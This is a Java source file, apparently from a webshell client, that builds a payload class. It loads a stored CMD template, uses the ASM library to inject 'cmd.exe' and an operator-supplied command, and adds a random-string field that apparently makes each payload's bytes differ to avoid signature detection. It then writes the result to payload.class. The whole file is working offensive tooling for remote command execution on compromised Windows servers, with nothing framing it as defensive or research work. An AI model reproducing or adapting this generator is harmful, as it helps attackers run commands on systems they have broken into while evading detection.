package com.txws;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;

import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.Type;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

class FileTools {
    public static byte[] readToBytes(String path) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        File ff = new File(path);
        FileInputStream fs = new FileInputStream(ff);
        byte[] temp = new byte[4096];
        while (true) {
            int len = fs.read(temp);
            if (len != -1) {
                bos.write(temp, 0, len);
            } else {
                fs.close();
                byte[] data = bos.toByteArray();
                bos.close();
                return data;
            }
        }
    }
}

class JavaCodeApi {
    public static byte[] getCode(String filename, String type) throws Exception {
        String dic = "config" + "/" + type + "/" + filename + ".class";
        try {
            byte[] cdata = FileTools.readToBytes(dic);
            if (cdata != null) {
                return cdata;
            }
            throw new Exception("读取" + dic + "本地API代码失败！");
        } catch (Exception e) {
            throw new Exception("读取" + dic + "本地API代码失败！");
        }
    }

}

class Params {
    public static byte[] setClassParams(byte[] classData, final Map<String, String> params) throws Exception {
        ClassReader classReader = new ClassReader(classData);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                Object c = params.get(filedName);
                return super.visitField(arg0, filedName, arg2, arg3, c);
            }

            public void visitEnd() {
                this.cv.visitField(1, "randstr", Type.getDescriptor(String.class), (String) null, Tools.randStr(128));
            }
        };
        classReader.accept(cv, 0);
        byte[] result = cw.toByteArray();
        return result;
    }
}

class Tools {
    public static Random f32r = new Random();

    public static String randStr(int max) {
        int max2 = f32r.nextInt(max);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < max2; i++) {
            int result = f32r.nextInt(25) + 97;
            sb.append(String.valueOf((char) result));
        }
        return sb.toString();
    }

}

public class CMD {
    public byte[] getBaseCodeExe(LinkedHashMap<String, String> params, String ws, String api) throws Exception {
        try {
            byte[] cdata = JavaCodeApi.getCode(api, ws);
            if (params != null) {
                cdata = Params.setClassParams(cdata, params);
            }
            return cdata;
        } catch (Exception ex) {
            throw new Exception("加工执行代码错误" + ex.getLocalizedMessage());
        }
    }

    public static void main(String[] args) throws Exception {
        String cmdPath = "cmd.exe";
        String cmd = args[0];
        
        CMD c = new CMD();
        LinkedHashMap<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmdPath", cmdPath);
        params.put("exit", Boolean.toString(true));
        params.put("cmd", cmd);
        c.getBaseCodeExe(params, "java", "CMD");
        byte[] cdata = c.getBaseCodeExe(params, "java", "CMD");
        File ff = new File("payload.class");
        FileOutputStream payload = new FileOutputStream(ff);
        payload.write(cdata);
        payload.close();
    }
}